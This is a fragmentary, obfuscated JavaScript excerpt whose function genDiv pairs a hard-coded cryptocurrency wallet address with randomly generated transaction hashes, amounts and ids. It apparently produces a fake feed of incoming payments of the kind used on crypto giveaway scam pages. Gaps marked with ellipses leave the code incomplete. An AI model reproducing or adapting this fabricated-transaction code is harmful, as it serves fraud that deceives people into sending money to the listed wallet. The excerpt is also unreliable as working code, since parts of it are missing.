...
function genDiv() {
    divCounter++;
    let valet = "0x3fCcbE63E1C653AC6a559Ee14606C101fC2361E4";
    var _0xe480x9 =
    ...
    let _0xe480xd = '0x' + randomString(5) + '...';
    let _0xe480xe = '';
    let _0xe480xf = valet.substring(0, 6);
    let valueSend = randomIntegerBTC(0.002, 2);
    ...
    let _0xe480x13 = "616" + randomInteger(1, 22) + randomInteger(1, 9) + randomInteger(1, 9);
